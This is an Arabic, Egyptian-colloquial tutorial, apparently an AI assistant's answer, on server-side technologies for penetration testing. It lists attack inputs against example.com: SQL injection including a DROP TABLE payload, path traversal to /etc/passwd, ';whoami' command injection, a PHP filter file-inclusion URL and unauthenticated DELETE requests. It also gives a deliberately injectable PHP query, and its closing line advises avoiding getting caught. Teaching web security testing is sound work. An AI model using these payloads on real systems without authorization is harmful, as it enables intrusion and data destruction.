تمام، هنشرح **تقنيات جانب السيرفر (Server-Side Technologies - Databases, APIs, Backend Frameworks)** بنفس الطريقة السابقة: شرح مفصل وعملي مع أكواد وأوامر، مع تركيز على اختبار الاختراق (Pentesting)، وبعد كل جزء هخلّص بالعامية المصرية، وفي الآخر هقدم خطوات عملية للاستغلال.

---

### **1. شرح تقنيات جانب السيرفر بالتفصيل:**

#### **أ. المفهوم الأساسي (What Are Server-Side Technologies):**
- تقنيات جانب السيرفر هي اللي بتشتغل على السيرفر، مش في المتصفح. بتتعامل مع الطلبات اللي جاية من العميل (Client) وبترد عليها بعد ما تعالج البيانات:
  - **Databases:** تخزين واسترجاع البيانات (زي MySQL).
  - **APIs:** واجهات لتبادل البيانات (زي REST).
  - **Backend Frameworks:** أدوات بتسهل كتابة الكود (زي Django أو Express).
- السيرفر هو اللي بيفكر ويشتغل، والعميل بس بيشوف النتيجة.

- **مثال عملي:**
  - تسجيل دخول:
    - طلب: `POST /login` مع `username=test&password=123`.
    - السيرفر يسأل الـ Database: `SELECT * FROM users WHERE username='test' AND password='123'`.
    - رد: `HTTP/1.1 200 OK` مع `"Welcome, test"`.

- **جانب عملي للبينتست:**
  - جرب تشوف رد السيرفر:
    - `curl -X POST -d "username=test&password=123" http://example.com/login`.
  - اكتشف التقنيات:
    - `curl -I http://example.com | grep Server` (نوع السيرفر).

- **خلاصة بالعامية:**
  - "جانب السيرفر ده المطبخ بتاع الموقع، هو اللي بيجهز الأكل ويخزن المكونات، لو دخلته هتعمل اللي إنت عايزه."

---

#### **ب. التقنيات ودورها (Technologies & Roles):**

1. **Databases (قواعد البيانات):**
   - بتخزن البيانات (مستخدمين، منتجات، إلخ) وبتجيبها لما تحتاجها.
   - أمثلة: MySQL، PostgreSQL، MongoDB.
   - مثال (MySQL):
     ```
     SELECT * FROM users WHERE id = 1;
     ```
   - عملي: لو مكشوفة: `mysql -h example.com -u root -p` (جرب تتصل).

2. **APIs (واجهات البرمجة):**
   - بتسمح للعميل يطلب بيانات أو يعدلها (زي REST أو GraphQL).
   - مثال (REST):
     ```
     GET /api/users/1 HTTP/1.1
     Host: example.com
     ```
     - رد: `{"id": 1, "name": "test"}`.
   - عملي: `curl http://example.com/api/users/1`.

3. **Backend Frameworks (إطار عمل الخلفية):**
   - بتسهل كتابة الكود وتنظيمه (زي PHP Laravel، Python Django، Node.js Express).
   - مثال (Express):
     ```
     app.get('/users/:id', (req, res) => {
       res.send({id: req.params.id, name: 'test'});
     });
     ```

- **جانب عملي للبينتست:**
  - Databases: جرب SQLi: `curl http://example.com/api/users/1' OR '1'='1`.
  - APIs: جرب معلمات غريبة: `curl http://example.com/api/users/1/../../etc/passwd` (Path Traversal).
  - Frameworks: لو لقيت `X-Powered-By: PHP/7.4` في الرؤوس، ابحث عن ثغرات النسخة.

- **خلاصة بالعامية:**
  - "الداتابيز هي المخزن، الـ API هي الشباك، والفريموورك هو الطباخ، لو كسرت حاجة منهم هتتحكم في المطبخ كله."

---

#### **ج. كيف تشتغل مع بعض (How They Work Together):**
- الـ Framework بيستقبل الطلب من العميل، بيحلله، بيجيب البيانات من الـ Database عبر الـ API أو الكود، وبيرد على العميل.
- مثال:
  - طلب: `GET /api/users/1`.
  - Framework (PHP):
    ```
    $id = $_GET['id'];
    $result = $db->query("SELECT * FROM users WHERE id = $id");
    echo json_encode($result);
    ```
  - رد: `{"id": 1, "name": "test"}`.

- **جانب عملي للبينتست:**
  - SQLi: `curl http://example.com/api/users/1' OR '1'='1` (لو رجع بيانات زيادة).
  - API: جرب `DELETE /api/users/1` بدون تصريح (سوء تهيئة).
  - Framework: لو بيرجع أخطاء: `curl http://example.com/api/users/1;ls` (Command Injection).

- **خلاصة بالعامية:**
  - "التلاتة دول زي فريق شغل، لو حد فيهم نام أو غلط، هتدخل تخلّص على السيستم كله."

---

#### **د. الثغرات المرتبطة (Vulnerabilities):**
- **SQL Injection:** لو الـ Database بتاخد إدخال غير محمي.
- **API Misconfiguration:** لو الـ API بيدي وصول زيادة.
- **Framework Bugs:** ثغرات في الإصدارات (زي Laravel أو Express).
- **Server Errors:** لو بيكشف تفاصيل (مثل Stack Traces).

- **مثال عملي:**
  - SQLi: `curl http://example.com/api/users/1' DROP TABLE users --`.
  - API: `curl http://example.com/api/admin` (لو بيدي وصول بدون Auth).

- **جانب عملي للبينتست:**
  - SQLi: `sqlmap -u http://example.com/api/users?id=1 --dbs`.
  - API: جرب طرق غير متوقعة: `curl -X PUT -d '{"admin":true}' http://example.com/api/users/1`.
  - Framework: لو `Server: Apache` مع `X-Powered-By: PHP/7.2`: ابحث عن CVEs.
  - Errors: `curl http://example.com/api/users/1' OR 'a'='b` (شوف لو بيرجع تفاصيل).

- **خلاصة بالعامية:**
  - "التقنيات دي لو مش متظبطة هتبقى زي الباب المفتوح، حقن الداتابيز، كسر الـ API، أو استغلال الفريموورك، وهتكون إنت الباشا."

---

### **خطوات عملية للاستغلال (Pentesting):**
1. **اكتشف التقنيات:**
   - `curl -I http://example.com | grep -i "server\|powered"` (نوع السيرفر والفريموورك).
   - `nmap -p 3306,5432 example.com` (كشف قواعد بيانات).

2. **اختبر الـ Databases:**
   - `curl http://example.com/api/users/1' OR '1'='1` (SQLi).
   - `sqlmap -u http://example.com/api/users?id=1 --tables`.

3. **هاجم الـ APIs:**
   - `curl http://example.com/api/users/1/../../etc/passwd` (Path Traversal).
   - `curl -X DELETE http://example.com/api/users/1` (بدون Auth).

4. **استغل الـ Frameworks:**
   - لو PHP: `curl http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index` (LFI).
   - لو Django: جرب Debug Mode: `curl http://example.com/abc123` (شوف لو بيرجع Stack Trace).

5. **تحلل الأخطاء:**
   - `curl http://example.com/api/users/1;whoami` (Command Injection).
   - ابحث عن ثغرات الإصدارات في CVE Databases.

---

### **خلاصة نهائية بالعامية:**
- "جانب السيرفر ده قلب الموقع، لو عرفت تضرب الداتابيز أو الـ API أو الفريموورك، هتتحكم في كل حاجة، بس خلّيك شاطر عشان متتركنش!"